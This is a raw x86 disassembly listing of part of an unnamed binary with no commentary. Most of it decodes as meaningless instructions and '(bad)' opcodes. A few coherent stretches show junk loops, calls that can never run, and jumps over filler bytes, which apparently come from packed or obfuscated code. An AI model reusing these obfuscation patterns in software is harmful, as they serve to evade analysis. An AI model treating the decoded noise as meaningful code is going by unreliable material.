  407206:	push   ebp
  407207:	jns    0x407222
  407209:	retf   
  40720a:	inc    esi
  40720b:	sbb    BYTE PTR [ebp-0x4784a15],bl
  407211:	fmul   QWORD PTR [esi]
  407213:	xchg   edx,eax
  407214:	in     al,dx
  407215:	mov    bh,bl
  407217:	sub    eax,0xddf29b6b
  40721c:	popf   
  40721d:	popa   
  40721e:	sub    esp,DWORD PTR ds:0xee99c680
  407224:	sar    DWORD PTR [edi-0x333a60bd],1
  40722a:	enter  0xbf14,0xba
  40722e:	fwait
  40722f:	es cli 
  407231:	out    dx,al
  407232:	daa    
  407233:	in     eax,0x35
  407235:	or     al,0x7c
  407237:	xchg   ebx,eax
  407238:	jp     0x407237
  40723a:	scas   eax,DWORD PTR es:[edi]
  40723b:	sbb    esi,esp
  40723d:	mov    es,WORD PTR [edx]
  40723f:	inc    eax
  407240:	and    edi,ebx
  407242:	jmp    0x1bf3:0x3af56a98
  407249:	(bad)  
  40724a:	cli    
  40724b:	sbb    ecx,edx
  40724d:	dec    esp
  40724e:	gs sub esp,esp
  407251:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407252:	mov    esp,0x9fd59939
  407257:	mov    bl,cl
  407259:	test   al,ch
  40725b:	xor    al,0x33
  40725d:	mov    BYTE PTR [edi-0x4915826c],dl
  407263:	pop    esi
  407264:	or     al,0xd6
  407266:	and    DWORD PTR [eax-0x5b],esi
  407269:	loopne 0x407233
  40726b:	push   ecx
  40726c:	stc    
  40726d:	jl     0x407292
  40726f:	lahf   
  407270:	std    
  407271:	pop    ebx
  407272:	repz vxorps xmm7,xmm4,XMMWORD PTR [esi+esi*2+0x37]
  407279:	dec    edx
  40727a:	inc    edi
  40727b:	fild   QWORD PTR [esi]
  40727d:	xor    ecx,DWORD PTR [esi]
  40727f:	les    edi,FWORD PTR [ebp+0x2f]
  407282:	mov    dh,0xf8
  407284:	adc    ebp,DWORD PTR [edi-0x5e]
  407287:	mov    bl,0x4a
  407289:	rcl    BYTE PTR [ebp+0x10],1
  40728c:	into   
  40728d:	icebp  
  40728e:	xchg   bh,dl
  407290:	push   ecx
  407291:	push   eax
  407292:	call   0x7b7ae1b2
  407297:	jo     0x407263
  407299:	mov    edi,0x8e1ed380
  40729e:	jmp    0x64674c8e
  4072a3:	sub    esp,ecx
  4072a5:	mov    bl,0xc0
  4072a7:	add    al,0x79
  4072a9:	mov    DWORD PTR ds:0x51748e0,0x99c81bfc
  4072b3:	xchg   BYTE PTR [ebp-0x43986e40],ah
  4072b9:	adc    al,0xb2
  4072bb:	jae    0x407278
  4072bd:	rcr    edx,0xb9
  4072c0:	mov    edx,DWORD PTR [ebp-0x20]
  4072c3:	mov    ebx,DWORD PTR [ebp-0x8]
  4072c6:	xor    edx,eax
  4072c8:	add    edx,ecx
  4072ca:	imul   edx,ebx
  4072cd:	cmp    edx,edi
  4072cf:	jbe    0x40619a
  4072d5:	pop    ebx
  4072d6:	jmp    0x407428
  4072db:	push   ds
  4072dc:	cld    
  4072dd:	dec    edi
  4072de:	or     ebp,DWORD PTR [ebp-0x27]
  4072e1:	jp     0x40728c
  4072e3:	adc    edi,0xe8e50f0c
  4072e9:	mov    ds:0x7e18f8bc,eax
  4072ee:	jle    0x407313
  4072f0:	jg     0x407370
  4072f2:	jle    0x407325
  4072f4:	push   ss
  4072f5:	cmp    ebx,DWORD PTR [ebx+0x61ff84f4]
  4072fb:	sub    eax,0xc90b1db6
  407300:	(bad)  ds:0x996a4445
  407306:	sbb    esi,DWORD PTR [ecx+eax*2+0x77]
  40730a:	xchg   edx,eax
  40730b:	aas    
  40730c:	sahf   
  40730d:	test   eax,0x735467be
  407312:	add    DWORD PTR [edi-0x1d],eax
  407315:	xor    eax,0xca05a69a
  40731a:	ficomp WORD PTR [ebp+edi*4-0x1e03f5b4]
  407321:	ins    BYTE PTR es:[edi],dx
  407322:	fldlg2 
  407324:	ret    0x642d
  407327:	aaa    
  407328:	xor    DWORD PTR [esi-0x49],eax
  40732b:	adc    cl,BYTE PTR [ebp+0x23]
  40732e:	and    cl,0x9c
  407331:	iret   
  407332:	leave  
  407333:	or     BYTE PTR [edi],ch
  407335:	lea    esi,[ebx+ebp*8-0x749cddc8]
  40733c:	jns    0x407326
  40733e:	xchg   DWORD PTR [ebp+ebp*4-0x6c08abc5],eax
  407345:	pushf  
  407346:	or     ch,ch
  407348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407349:	loopne 0x4072fd
  40734b:	sbb    eax,0x2ea04d09
  407350:	add    BYTE PTR [edi],al
  407352:	in     al,0x6e
  407354:	mov    eax,0x373ae10b
  407359:	ss jl  0x4073c9
  40735c:	add    esi,edi
  40735e:	js     0x407350
  407360:	add    al,0x28
  407362:	cmp    BYTE PTR [edi],ah
  407364:	adc    eax,0x575d9e42
  407369:	imul   eax,DWORD PTR [edi+0x4f],0x6b
  40736d:	dec    edi
  40736e:	push   ebp
  40736f:	sub    ch,ah
  407371:	cmp    al,0x63
  407373:	jmp    0x40c51dbc
  407378:	lods   al,BYTE PTR ds:[esi]
  407379:	cmp    eax,0xe32f7159
  40737e:	add    edi,DWORD PTR [esi+0x53a9bbab]
  407384:	dec    esp
  407385:	sbb    eax,0x368ba40e
  40738a:	mov    bh,0xe5
  40738c:	push   ds
  40738d:	sbb    al,0x7d
  40738f:	mov    edi,0x440e3d78
  407394:	leave  
  407395:	push   ebp
  407396:	in     al,0x55
  407398:	dec    edx
  407399:	mov    al,ds:0xaccca5b6
  40739e:	sahf   
  40739f:	rcl    esi,0xaa
  4073a2:	jl     0x40740e
  4073a4:	sbb    ah,ah
  4073a6:	(bad)  
  4073a7:	sahf   
  4073a8:	shufps xmm7,XMMWORD PTR [edi+0x6f],0xe8
  4073ad:	jp     0x40736b
  4073af:	fsub   QWORD PTR [eax]
  4073b1:	ja     0x407393
  4073b3:	adc    DWORD PTR [ebp-0x14210f0e],esi
  4073b9:	mov    ebp,0x8435e13b
  4073be:	(bad)  
  4073bf:	mov    ah,BYTE PTR [ebx]
  4073c1:	mov    esi,0x508ebc74
  4073c6:	jno    0x4073e6
  4073c8:	push   es
  4073c9:	test   BYTE PTR [edi+eax*1+0xcce704d],0x9c
  4073d1:	leave  
  4073d2:	shr    DWORD PTR [edi-0x55fb62de],cl
  4073d8:	mov    ds:0xbd99c54a,al
  4073dd:	xor    DWORD PTR fs:[esi],edi
  4073e0:	repz pop es
  4073e2:	sub    ah,dh
  4073e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073e5:	mov    ebx,0x5a1ac742
  4073ea:	aad    0xbf
  4073ec:	stos   DWORD PTR es:[edi],eax
  4073ed:	pop    ds
  4073ee:	xlat   BYTE PTR ds:[ebx]
  4073ef:	push   edx
  4073f0:	push   ecx
  4073f1:	push   ss
  4073f2:	pop    ss
  4073f3:	and    bh,BYTE PTR [eax+0xbe550be]
  4073f9:	nop
  4073fa:	mov    ebp,0xec6c7c82
  4073ff:	je     0x407458
  407401:	inc    edx
  407402:	adc    DWORD PTR [edx-0x7a307a0e],ebp
  407408:	mov    ecx,0xde2f6fb6
  40740d:	dec    eax
  40740e:	jbe    0x4073f8
  407410:	push   esp
  407411:	mov    al,0x90
  407413:	cmp    eax,0xebb31020
  407418:	jge    0x4073fa
  40741a:	jle    0x4073b2
  40741c:	out    dx,al
  40741d:	sti    
  40741e:	aaa    
  40741f:	push   ebp
  407420:	sub    BYTE PTR [edi+0x1c917a64],cl
  407426:	xor    eax,0xc2c95f49
  40742b:	or     BYTE PTR [eax],al
  40742d:	push   ebp
  40742e:	mov    ebp,esp
  407430:	jmp    0x4075bc
  407435:	jb     0x407447
  407437:	test   eax,0x8a95a91d
  40743c:	adc    DWORD PTR [ebp+eax*1+0x249727ff],edi
  407443:	push   ds
  407444:	out    0xad,eax
  407446:	sbb    DWORD PTR [esi+0x7e],edi
  407449:	jmp    0xb7bef2cd
  40744e:	dec    esp
  40744f:	pop    ebx
  407450:	jae    0x40743f
  407452:	mov    al,0x4c
  407454:	outs   dx,BYTE PTR ds:[esi]
  407455:	pop    ds
  407456:	daa    
  407457:	hlt    
  407458:	(bad)  
  407459:	xchg   ecx,eax
  40745a:	rcr    esi,0xa1
  40745d:	retf   0x11fc
  407460:	rcl    DWORD PTR [esp+ebp*4+0x7aefea36],cl
  407467:	or     BYTE PTR [edi+eiz*1],al
  40746a:	cmovge ebp,DWORD PTR [ecx]
  40746d:	mov    dh,0x67
  40746f:	or     BYTE PTR [esi+0x3972e22],bl
  407475:	pop    esi
  407476:	repz (bad) 
  407478:	out    dx,al
  407479:	les    esp,FWORD PTR [esi+0x1369c14a]
  40747f:	or     BYTE PTR [edx],al
  407481:	add    eax,0x32d9670b
  407486:	dec    ebp
  407487:	hlt    
  407488:	sar    BYTE PTR [edx],0x19
  40748b:	ins    DWORD PTR es:[edi],dx
  40748c:	std    
  40748d:	push   eax
  40748e:	adc    eax,0xbb65ee1
  407493:	aaa    
  407494:	imul   BYTE PTR [ebx]
  407496:	cmp    eax,0x99606944
  40749b:	and    al,0x5a
  40749d:	push   0x4e
  40749f:	mov    WORD PTR [edx],?
  4074a1:	push   es
  4074a2:	cmp    eax,0x5dd968e3
  4074a7:	gs or  eax,edx
  4074aa:	jb     0x40747c
  4074ac:	(bad)  [ebx+0x1b]
  4074af:	in     eax,dx
  4074b0:	scas   eax,DWORD PTR es:[edi]
  4074b1:	stos   BYTE PTR es:[edi],al
  4074b2:	fisttp QWORD PTR [ecx-0x1b]
  4074b5:	xchg   edi,eax
  4074b6:	or     DWORD PTR [edi],edx
  4074b8:	jbe    0x4074ab
  4074ba:	xchg   DWORD PTR cs:[eax],ecx
  4074bd:	aam    0x25
  4074bf:	fldenv [esi+edx*8]
  4074c2:	xchg   ecx,eax
  4074c3:	test   eax,0x80fae7fb
  4074c8:	jo     0x407542
  4074ca:	jo     0x4074c8
  4074cc:	std    
  4074cd:	leave  
  4074ce:	rol    ecx,1
  4074d0:	jns    0x407514
  4074d2:	aad    0x50
  4074d4:	cmp    eax,ecx
  4074d6:	push   edi
  4074d7:	push   ebp
  4074d8:	sub    al,0x36
  4074da:	fisttp DWORD PTR [edi-0x52]
  4074dd:	ss ja  0x4074d0
  4074e0:	mov    dh,0x27
  4074e2:	js     0x4074d6
  4074e4:	xchg   DWORD PTR ds:0x6f6a8ce2,edx
  4074ea:	dec    ebp
  4074eb:	arpl   dx,di
  4074ed:	push   ebp
  4074ee:	jne    0x40755e
  4074f0:	or     eax,0xf6af19d1
  4074f5:	mov    eax,0xe63a723b
  4074fa:	(bad)  
  4074fb:	(bad)  
  4074fc:	shl    BYTE PTR [esi],1
  4074fe:	jnp    0x4074e4
  407500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407501:	push   0xc59ba70c
  407506:	in     eax,0x21
  407508:	shl    DWORD PTR [esi],cl
  40750a:	iret   
  40750b:	pop    es
  40750c:	repnz dec ebp
  40750e:	pop    edi
  40750f:	mov    DWORD PTR [edx],edi
  407511:	mov    eax,0xad9da2a3
  407516:	push   edx
  407517:	jo     0x407595
  407519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40751a:	and    eax,0xb4671618
  40751f:	push   0x907b349b
  407524:	lea    ebx,ds:0xc4ce855d
  40752a:	jmp    0x407595
  40752c:	mov    cl,ch
  40752e:	lahf   
  40752f:	(bad)  
  407530:	xlat   BYTE PTR cs:[ebx]
  407532:	pop    edx
  407533:	mov    esi,0xafda2ee3
  407538:	rol    esi,cl
  40753a:	fwait
  40753b:	jmp    0x4075a0
  40753d:	ds cli 
  40753f:	lahf   
  407540:	iret   
  407541:	mov    ebp,0x94a51a33
  407546:	jb     0x407549
  407548:	xchg   edi,eax
  407549:	shl    BYTE PTR [esi+0x32],1
  40754c:	mov    edi,0x5f4d0b8b
  407551:	rcl    DWORD PTR [esi+0x75],cl
  407554:	rcl    eax,cl
  407556:	arpl   WORD PTR [edx],di
  407558:	inc    ebx
  407559:	jno    0x40752d
  40755b:	leave  
  40755c:	aam    0xfb
  40755e:	lea    ecx,[ecx+0x6c798759]
  407564:	xlat   BYTE PTR ds:[ebx]
  407565:	sub    eax,0x6b19b5c2
  40756b:	jae    0x407519
  40756d:	mov    BYTE PTR [ebx],al
  40756f:	add    al,0x5f
  407571:	imul   DWORD PTR [ebx+ebx*1+0x49]
  407575:	jb     0x4075e0
  407577:	xor    DWORD PTR [edx+0x2e],ecx
  40757a:	aaa    
  40757b:	int    0xbb
  40757d:	fsub   st(0),st
  40757f:	jge    0x40757f
  407581:	sub    eax,edi
  407583:	aaa    
  407584:	pushf  
  407585:	add    esp,DWORD PTR [edx-0x306d73ff]
  40758b:	mov    esi,0x91c51137
  407590:	(bad)  
  407591:	xor    esp,DWORD PTR [esi]
  407593:	jb     0x4075b8
  407595:	outs   dx,BYTE PTR ds:[esi]
  407596:	cdq    
  407597:	pop    ebp
  407598:	es adc eax,0x72d60223
  40759e:	pop    es
  40759f:	pop    esi
  4075a0:	jb     0x40753a
  4075a2:	add    DWORD PTR gs:[ecx+0xc],esp
  4075a6:	adc    DWORD PTR [edi+0x64],edx
  4075a9:	dec    edi
  4075aa:	pop    eax
  4075ab:	mov    edi,0xc55b9364
  4075b0:	out    0xf5,al
  4075b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075b3:	and    BYTE PTR [ebp+0x2e291546],bh
  4075b9:	xor    edi,DWORD PTR [esp+esi*8]
  4075bc:	push   ecx
  4075bd:	push   ecx
  4075be:	and    DWORD PTR ds:0x41abce,0x0
  4075c8:	jmp    0x4075da
  4075cd:	mov    edx,DWORD PTR ds:0x41abce
  4075d3:	inc    edx
  4075d4:	mov    DWORD PTR ds:0x41abce,edx
  4075da:	cmp    DWORD PTR ds:0x41abce,0x1e
  4075e1:	jae    0x407619
  4075e7:	cmp    DWORD PTR ds:0x41abce,0x20
  4075ee:	jne    0x40760a
  4075f4:	push   DWORD PTR [ebp-0x28]
  4075f7:	push   0x365e
  4075fc:	push   DWORD PTR [ebp-0x18]
  4075ff:	push   0x4c62
  407604:	call   DWORD PTR ds:0x40d004
  40760a:	jmp    0x4075cd
  40760f:	xor    DWORD PTR ds:0x412374,0x3a52
  407619:	mov    eax,0xf89c8538
  40761e:	sub    ecx,ecx
  407620:	mov    DWORD PTR [ebp-0x8],eax
  407623:	and    DWORD PTR ds:0x41abd6,0x0
  40762d:	jmp    0x40763f
  407632:	mov    ecx,DWORD PTR ds:0x41abd6
  407638:	inc    ecx
  407639:	mov    DWORD PTR ds:0x41abd6,ecx
  40763f:	cmp    DWORD PTR ds:0x41abd6,0x1e
  407646:	jae    0x4076c6
  40764c:	cmp    DWORD PTR ds:0x41abd6,0x2d
  407653:	jne    0x40765f
  407659:	call   DWORD PTR ds:0x40d1d8
  40765f:	jmp    0x407632
  407664:	and    DWORD PTR ds:0x417e45,0x0
  40766e:	jmp    0x407680
  407673:	mov    edx,DWORD PTR ds:0x417e45
  407679:	inc    edx
  40767a:	mov    DWORD PTR ds:0x417e45,edx
  407680:	cmp    DWORD PTR ds:0x417e45,0x1b
  407687:	jae    0x4076c6
  40768d:	cmp    DWORD PTR ds:0x417e45,0x8
  407694:	jne    0x4076a5
  40769a:	push   0x41abea
  40769f:	call   DWORD PTR ds:0x40d1dc
  4076a5:	cmp    DWORD PTR ds:0x417e45,0x7
  4076ac:	jne    0x4076c1
  4076b2:	xor    edx,edx
  4076b4:	add    edx,DWORD PTR ds:0x417e45
  4076ba:	inc    edx
  4076bb:	mov    DWORD PTR ds:0x417e45,edx
  4076c1:	jmp    0x407673
  4076c6:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  4076cd:	mov    edx,DWORD PTR [ebp-0x8]
  4076d0:	push   esi
  4076d1:	adc    esi,ecx
  4076d3:	mov    ecx,0x7510859
  4076d8:	xor    edx,ecx
  4076da:	mov    esi,0x32729f
  4076df:	push   edi
  4076e0:	mov    edi,DWORD PTR [ebp+0x10]
  4076e3:	add    edx,esi
  4076e5:	cmp    edi,edx
  4076e7:	jmp    0x407873
  4076ec:	iret   
  4076ed:	in     eax,0x74
  4076ef:	push   edx
  4076f0:	adc    al,0x63
  4076f2:	jns    0x40776d
  4076f4:	int    0x3e
  4076f6:	les    ebp,FWORD PTR [esi+0xa]
  4076f9:	aad    0x5
  4076fb:	repz sbb al,0x1f
  4076fe:	jle    0x40777e
  407700:	jmp    0x4bbef584
  407705:	es aam 0x31
  407708:	push   cs
  407709:	pop    ds
  40770a:	into   
  40770b:	sbb    bl,BYTE PTR [esi+0x7]
  40770e:	dec    edx
  40770f:	clc    
  407710:	jmp    0xb82fffb1
  407715:	sbb    esp,DWORD PTR [ebx+0x2]
  407718:	je     0x4076c9
  40771a:	gs mov edx,0x453e8
  407720:	mov    al,0x92
  407722:	mov    DWORD PTR [ecx+0x5eb5049d],ecx
  407728:	jmp    0x407754
  40772a:	jl     0x407730
  40772c:	fisub  DWORD PTR [esi]
  40772e:	in     eax,dx
  40772f:	pop    ss
  407730:	scas   eax,DWORD PTR es:[edi]
  407731:	aaa    
  407732:	hlt    
  407733:	popa   
  407734:	cld    
  407735:	daa    
  407736:	mov    esi,0x727b7e0a
  40773b:	out    dx,al
  40773c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40773d:	pop    ebp
  40773e:	mov    dh,BYTE PTR fs:[ebx]
  407741:	hlt    
  407742:	inc    esp
  407743:	es out 0xe8,al
  407746:	mov    eax,0xb1459c17
  40774b:	cdq    
  40774c:	push   0x7a
  40774e:	leave  
  40774f:	inc    ebx
  407750:	mov    dh,0x76
  407752:	mov    eax,0xa9601e55
  407757:	stos   BYTE PTR es:[edi],al
  407758:	test   BYTE PTR [esi],bl
  40775a:	jecxz  0x407705
  40775c:	push   edx
  40775d:	sub    ecx,edx
  40775f:	jl     0x4077ae
  407761:	dec    ecx
  407762:	clc    
  407763:	and    al,0xf9
  407765:	fbstp  TBYTE PTR [eax]
  407767:	les    eax,FWORD PTR [ecx-0x127a5507]
  40776d:	lods   al,BYTE PTR ds:[esi]
  40776e:	adc    BYTE PTR [esi+0x12],bl
  407771:	jl     0x407755
  407773:	int3   
  407774:	push   cs
  407775:	inc    ebx
  407776:	mov    esi,0x44fc7c5e
  40777b:	arpl   WORD PTR [ebp+0x45],cx
  40777e:	pusha  
  40777f:	adc    BYTE PTR [edx],ch
  407781:	sahf   
  407782:	jo     0x4077dd
  407784:	(bad)
  407788:	or     BYTE PTR [ecx+0x3],dl
  40778b:	cdq    
  40778c:	sbb    ebx,ebx
  40778e:	push   DWORD PTR [eax+0x272c306b]
  407794:	xchg   ebx,eax
  407795:	not    ah
  407797:	xchg   ecx,eax
  407798:	ss leave 
  40779a:	add    eax,0x71c8807f
  40779f:	mov    ds:0x9078a347,eax
  4077a4:	(bad)  
  4077a5:	mov    ds:0xa34ab3ab,al
  4077aa:	ins    DWORD PTR es:[edi],dx
  4077ab:	or     eax,0xa8d657dc
  4077b0:	xchg   ebp,eax
  4077b1:	repnz retf 0x6227
  4077b5:	xchg   BYTE PTR [edx+ecx*4],ch
  4077b8:	pop    ds
  4077b9:	xchg   edx,eax
  4077ba:	jecxz  0x4077e9
  4077bc:	pop    ss
  4077bd:	aaa    
  4077be:	fwait
  4077bf:	mov    ds:0x73a1227c,al
  4077c4:	scas   eax,DWORD PTR es:[edi]
  4077c5:	out    dx,al
  4077c6:	add    ch,ah
  4077c8:	(bad)  
  4077c9:	adc    esi,ebp
  4077cb:	stos   DWORD PTR es:[edi],eax
  4077cc:	dec    eax
  4077cd:	cmp    eax,ecx
  4077cf:	add    al,BYTE PTR [edi-0x5e5f0991]
  4077d5:	sub    al,0x1f
  4077d7:	seto   BYTE PTR [edx+0x44]
  4077db:	jg     0x40780a
  4077dd:	sub    ecx,DWORD PTR [ecx]
  4077df:	scas   al,BYTE PTR es:[edi]
  4077e0:	dec    esi
  4077e1:	and    al,0x23
  4077e3:	and    eax,0x298aed04
  4077e8:	pop    ecx
  4077e9:	movups XMMWORD PTR [ecx],xmm5
  4077ec:	loop   0x4077a6
  4077ee:	daa    
  4077ef:	(bad)  
  4077f0:	sbb    DWORD PTR [esi+0x1a447f8e],ebp
  4077f6:	jbe    0x407866
  4077f8:	sub    BYTE PTR [ecx-0x65],cl
  4077fb:	je     0x407784
  4077fd:	push   esi
  4077fe:	bnd jo 0x4077c2
  407801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407802:	mov    dh,0x3e
  407804:	packsswb mm6,QWORD PTR [eax]
  407807:	inc    esp
  407808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407809:	xchg   esp,eax
  40780a:	xchg   esi,eax
  40780b:	cmp    ch,BYTE PTR [ebx]
  40780d:	inc    ebp
  40780e:	clc    
  40780f:	adc    BYTE PTR [edi-0xc],0x8
  407813:	in     al,dx
  407814:	cmp    ah,bl
  407816:	test   al,0x65
  407818:	mov    edi,0x40ceea2c
  40781d:	lds    edx,FWORD PTR [ecx+0x55]
  407820:	imul   ebx,ecx,0xe10749d4
  407826:	repnz sbb BYTE PTR [eax],al
  407829:	jmp    0xae7e:0x3925e4ae
  407830:	and    al,0x33
  407832:	push   edi
  407833:	pop    edi
  407834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407836:	mov    dh,BYTE PTR [ecx+0x1c]
  407839:	xor    bh,BYTE PTR [ecx-0x7b]
  40783c:	aaa    
  40783d:	sbb    edx,DWORD PTR [edx-0x6b]
  407840:	outs   dx,DWORD PTR ds:[esi]
  407841:	in     eax,dx
  407842:	pop    ecx
  407843:	bnd jmp 0x4e382f10
  407849:	cmp    eax,0xcbbfdb81
  40784e:	or     DWORD PTR [edx+edi*8+0x75],edx
  407852:	push   eax
  407853:	ds xchg ecx,eax
  407855:	push   ecx
  407856:	mov    di,WORD PTR [edi]
  407859:	das    
  40785a:	xchg   ebp,eax
  40785b:	ds sti 
  40785d:	fcomp  st(6)
  40785f:	retf   0x5493
  407862:	and    DWORD PTR [esi-0xb],ecx
  407865:	ret    
  407866:	or     cl,BYTE PTR [edi+0x7c406ca7]
  40786c:	mov    dl,0x63
  40786e:	das    
  40786f:	fild   DWORD PTR [edi-0x30]
  407872:	cmp    eax,0x38b840f
  407877:	add    BYTE PTR [eax],al
  407879:	jmp    0x407a05
  40787e:	in     eax,dx
  40787f:	(bad)  
  407880:	pop    esi
  407881:	jg     0x4078d7
  407883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407884:	ins    DWORD PTR es:[edi],dx
  407885:	in     eax,0x5e
  407887:	imul   eax,DWORD PTR [esi-0x41fb4e74],0x54
  40788e:	(bad)  
  40788f:	sbb    al,0x7e
  407891:	jle    0x40787c
  407893:	jg     0x407913
  407895:	jle    0x407877
  407897:	repz (bad) 
  407899:	out    dx,eax
  40789a:	cmp    al,0xf9
  40789c:	outs   dx,BYTE PTR ds:[esi]
  40789d:	sbb    edi,DWORD PTR [ebx-0x4d]
  4078a0:	xchg   ecx,eax
  4078a1:	icebp  
  4078a2:	and    eax,0xc2f280be
  4078a7:	mov    cl,0x77
  4078a9:	dec    esi
  4078aa:	xchg   ebx,eax
  4078ab:	mov    ds:0xca82aedb,al
  4078b0:	mov    bh,0x9a
  4078b2:	or     edx,DWORD PTR [ebx+0x32]
  4078b5:	int3   
  4078b6:	test   edi,esp
  4078b8:	pop    ebp
  4078b9:	call   0xc2a4:0x708f17a
  4078c0:	xchg   DWORD PTR [ecx],ebp
  4078c2:	mov    ds:0x821de20d,eax
  4078c7:	or     esp,ebp
  4078c9:	bound  ecx,QWORD PTR [edi]
  4078cb:	pop    ecx
  4078cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078cd:	fnstsw WORD PTR [eax+0x410ccb6f]
  4078d3:	sub    BYTE PTR [ebp+eax*4+0x4],cl
  4078d7:	ds push 0x5919f8e6
  4078dd:	ficom  DWORD PTR [ecx]
  4078df:	inc    edi
  4078e0:	adc    ecx,DWORD PTR [eax+0x76]
  4078e3:	pop    ss
  4078e4:	inc    ecx
  4078e5:	sbb    DWORD PTR [eax],edx
  4078e7:	cmp    DWORD PTR [ebp+0x4af2f245],ebp
  4078ed:	fstp   DWORD PTR [ecx-0x16f7e49b]
  4078f3:	sar    al,cl
  4078f5:	(bad)  
  4078f6:	cdq    
  4078f7:	fldcw  WORD PTR [esi]
  4078f9:	jecxz  0x407932
  4078fb:	inc    edi
  4078fc:	das    
  4078fd:	mov    eax,ds:0xb591f192
  407902:	add    edx,DWORD PTR [esi]
  407904:	mov    esp,0xebe0471f
  407909:	out    dx,al
  40790a:	(bad)
  40790e:	sti    
  40790f:	idiv   DWORD PTR [esi-0x17]
  407912:	call   0x34e3:0x64966247
  407919:	jle    0x4078a0
  40791b:	in     al,dx
  40791c:	ins    BYTE PTR es:[edi],dx
  40791d:	mov    dh,0x63
  40791f:	push   ebx
  407920:	xlat   BYTE PTR ds:[ebx]
  407921:	inc    esi
  407922:	call   0xf553:0xf17faced
  407929:	out    dx,eax
  40792a:	int3   
  40792b:	jge    0x40793d
  40792d:	fwait
  40792e:	(bad)  
  40792f:	cld    
  407930:	mov    eax,ds:0x769e013e
  407935:	scas   al,BYTE PTR es:[edi]
  407936:	pop    edi
  407937:	inc    edi
  407938:	(bad)  [ebx+0x3221ce90]
  40793e:	inc    ebp
  40793f:	or     ch,BYTE PTR [ecx-0x3a28cc53]
  407945:	popf   
  407946:	fldcw  WORD PTR [edi-0x63f86ad4]
  40794c:	je     0x407965
  40794e:	inc    ecx
  40794f:	loope  0x4079a4
  407951:	pop    eax
  407952:	xor    ah,BYTE PTR [eax-0x6d]
  407955:	adc    al,0x2f
  407957:	stc    
  407958:	shl    BYTE PTR [edx-0x52f1195],0x2b
  40795f:	dec    esi
  407960:	xor    DWORD PTR [edi-0x30],0xd1f7d78
  407967:	mov    al,BYTE PTR [edi+0x65]
  40796a:	push   ecx
  40796b:	enter  0x48b9,0x8f
  40796f:	xchg   esp,eax
  407970:	add    edx,DWORD PTR [esi]
  407972:	cmp    BYTE PTR [ebx],ch
  407974:	xor    al,0x67
  407976:	push   esi
  407977:	aaa    
  407978:	add    eax,edx
  40797a:	test   ch,bh
  40797c:	xor    eax,0xaa99888a
  407981:	add    al,0x4b
  407983:	and    eax,0xa9a0d21c
  407988:	xchg   al,al
  40798a:	push   esp
  40798b:	add    al,0x80
  40798d:	and    al,0xa5
  40798f:	lds    esp,FWORD PTR ds:0xbdc5743a
  407995:	js     0x4079e4
  407997:	mov    edi,0xd57a9f47
  40799c:	rcr    BYTE PTR [ebx],0xd7
  40799f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079a0:	push   eax
  4079a1:	fild   DWORD PTR [edi+esi*8+0x4f]
  4079a5:	jmp    0x1c07b563
  4079aa:	icebp  
  4079ab:	sbb    al,0x89
  4079ad:	mov    esp,0x3ac1a46e
  4079b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079b3:	fwait
  4079b4:	dec    ecx
  4079b5:	lods   al,BYTE PTR ds:[esi]
  4079b6:	jmp    0xfc18c878
  4079bb:	xchg   esi,eax
  4079bc:	mov    eax,ds:0x7fada298
  4079c1:	loope  0x4079f8
  4079c3:	cmp    ah,cl
  4079c5:	test   al,0x4b
  4079c7:	and    ebx,DWORD PTR [eax+0x39]
  4079ca:	outs   dx,DWORD PTR ds:[esi]
  4079cb:	mov    edx,0xfedaccf5
  4079d0:	and    DWORD PTR [ebp-0x73d9df90],esp
  4079d6:	sub    BYTE PTR [edx-0x2d],dh
  4079d9:	hlt    
  4079da:	and    al,0xba
  4079dc:	out    0xcd,eax
  4079de:	pop    ebp
  4079df:	pop    esi
  4079e0:	in     al,0xe6
  4079e2:	gs xchg esp,eax
  4079e4:	mov    WORD PTR [edx-0x59577a],fs
  4079ea:	xchg   DWORD PTR [edi-0x1b457be9],ecx
  4079f0:	mov    esp,0x7a604757
  4079f5:	xchg   edx,eax
  4079f6:	fst    QWORD PTR [ebp-0x4b168a52]
  4079fc:	mov    al,0xfa
  4079fe:	sub    ah,BYTE PTR [edx]
  407a00:	sahf   
  407a01:	pop    esi
  407a02:	sti    
  407a03:	(bad)  
  407a05:	mov    edx,DWORD PTR [ebp-0x8]
  407a08:	mov    eax,DWORD PTR [ebp-0x4]
  407a0b:	xor    eax,ecx
  407a0d:	mov    edi,0xffcd8d61
  407a12:	sub    edi,eax
  407a14:	jmp    0x407ba0
  407a19:	les    edi,FWORD PTR [eax]
  407a1b:	add    ch,BYTE PTR [edi-0x1e]
  407a1e:	gs jns 0x4079da
  407a21:	dec    esp
  407a22:	hlt    
  407a23:	sbb    BYTE PTR [ecx+0x4e],0xd9
  407a27:	bound  ecx,QWORD PTR [ebp+0x7e]
  407a2a:	adc    bh,BYTE PTR [esi+0x7e]
  407a2d:	jmp    0x15bef8b1
  407a32:	sub    al,0xe0
  407a34:	sbb    DWORD PTR [eax-0x691ce89b],0xffffffd6
  407a3b:	adc    al,0xa8
  407a3d:	jecxz  0x407a91
  407a3f:	dec    eax
  407a40:	sbb    DWORD PTR [esi+ecx*8-0x633905d9],edx
  407a47:	int    0x81
  407a49:	sbb    al,0xed
  407a4b:	mov    al,ds:0x8ddb0ad3
  407a50:	loop   0x4079f4
  407a52:	or     DWORD PTR [edx+0x71fad03],edi
  407a58:	into   
  407a59:	lahf   
  407a5a:	cmp    edi,DWORD PTR [ebp+0x10]
  407a5d:	mov    bl,BYTE PTR [edx]
  407a5f:	adc    BYTE PTR [eax-0x412b7255],bl
  407a65:	fist   DWORD PTR [ebx]
